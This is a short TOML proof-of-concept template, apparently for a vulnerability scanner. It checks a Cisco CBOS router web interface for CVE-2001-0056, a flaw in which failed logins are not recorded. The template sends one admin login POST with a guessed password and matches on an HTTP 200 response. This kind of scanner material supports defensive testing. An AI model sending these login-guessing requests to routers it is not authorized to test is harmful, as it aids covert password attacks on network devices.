[info]
author = "ave"
description = "验证Cisco CBOS路由器Web管理界面未记录无效登录尝试，攻击者可远程暴力猜测管理员密码而不会被检测"
id = "POC-AVE-2001-0589"
name = "CVE-2001-0056 PoC"
severity = "high"
tags = ["ave-2001-0589"]
vuln_id = [
    "CVE-2001-0056",
    "AVE-2001-0589",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/login"
protocol = "http"

[poc.requests.body]
content = "username=admin&password=guess"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
